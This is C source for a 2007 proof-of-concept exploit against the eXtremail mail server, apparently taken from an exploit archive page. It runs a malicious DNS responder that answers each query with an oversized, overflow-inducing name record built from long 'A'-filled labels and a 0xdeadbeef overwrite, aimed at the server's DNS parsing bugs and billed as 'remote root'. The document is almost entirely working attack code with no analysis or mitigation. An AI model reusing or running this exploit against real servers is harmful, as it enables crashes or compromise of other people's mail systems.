<html><head><title>eXtremail <= 2.1.1 DNS Parsing Bugs Remote Exploit PoC</title></head><pre>/* extremail-v9.c
 *
 * Copyright (c) 2007 by &lt;mu-b@digit-labs.org&gt;
 *
 * eXtremail &lt;2.1.1 remote root POC (x86-lnx)
 * by mu-b - Tue Feb 6 2007
 *
 * - Tested on: eXtremail 2.1.0 (lnx)
 *              eXtremail 2.1.1 (lnx)
 *
 * POC for DNS parsing bugs...
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

#define DNS_HDR_LEN   12
#define DNS_TRAIL_LEN 20

#define DNS_PORT      53
#define DNS_MAX_MSG   0x200

#define HAMMER_LEN    284

static char * dns_hdr_buf =
  &quot;\x69\x69&quot;  /* transaction id */
  &quot;\x81\x80&quot;  /* flags */
  &quot;\x00\x01&quot;  /* questions */
  &quot;\x00\x01&quot;  /* answers rrs */
  &quot;\x00\x00&quot;  /* authority rrs */
  &quot;\x00\x00&quot;; /* additional rrs */

static char * dns_trail_buf =
  &quot;\x00\x01&quot;          /* type */
  &quot;\x00\x01&quot;          /* class */
  /* Answers */
  &quot;\xc0\x0c&quot;          /* name ptr */
  &quot;\x00\x01&quot;          /* type */
  &quot;\x00\x01&quot;          /* class */
  &quot;\x00\x01\x51\x80&quot;  /* ttl (1 day) */
  &quot;\x00\x04&quot;          /* data length */
  &quot;\xff\xff\xff\xff&quot;; /* 255.255.255.255 */

int
main (int argc, char *argv[])
{
  int sock, result;
  struct sockaddr_in cliaddr, servaddr;

  printf (&quot;eXtremail 2.1.1 remote root POC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n&quot;);

  sock = socket (AF_INET, SOCK_DGRAM, 0);
  if (sock &lt; 0)
    {
      perror (&quot;socket()&quot;);
      exit (EXIT_FAILURE);
    }

  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = htonl (INADDR_ANY);
  servaddr.sin_port = htons (DNS_PORT);
  result = bind (sock, (struct sockaddr *) &amp;servaddr, sizeof servaddr);
  if (result &lt; 0)
    {
      perror (&quot;bind()&quot;);
      exit (EXIT_FAILURE);
    }

  printf (&quot;+Waiting for data on port %d...\n&quot;, DNS_PORT);

  while (1)
    {
      int n, clilen, curlen, len;
      char rbuf[DNS_MAX_MSG], sbuf[DNS_MAX_MSG*4];
      char *ptr;

      memset (rbuf, 0, sizeof rbuf);
      memset (sbuf, 0, sizeof sbuf);

      /* receive message */
      clilen = sizeof cliaddr;
      n = recvfrom (sock, rbuf, DNS_MAX_MSG, 0, (struct sockaddr *) &amp;cliaddr, &amp;clilen);

      if (n &lt; 0)
        {
          printf (&quot;- cannot receive data!\n&quot;);
          continue;
        }

      /* print received message */
      printf (&quot;+ Connection from %s: %u\n&quot;,
              inet_ntoa (cliaddr.sin_addr),
              ntohs (cliaddr.sin_port));

      /* formulate reply */
      ptr = sbuf;
      memcpy (ptr, dns_hdr_buf, DNS_HDR_LEN);
      ptr += DNS_HDR_LEN;

      for (len = 0; len &lt; HAMMER_LEN; ptr += curlen)
      {
        if (len + 63 &gt; HAMMER_LEN)
          curlen = HAMMER_LEN - len;
        else
          curlen = 63;

        len += curlen;
        *ptr++ = curlen;
        memset (ptr, 0x41, curlen);
      }

      *((unsigned long *)(ptr - 4)) = 0xdeadbeef;
      *ptr++ = 0x00;
      memcpy (ptr, dns_trail_buf, DNS_TRAIL_LEN);
      ptr += DNS_TRAIL_LEN;

      n = sendto (sock, sbuf, ptr-sbuf, 0, (struct sockaddr *) &amp;cliaddr, clilen);
    }

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-04-20]</pre></html>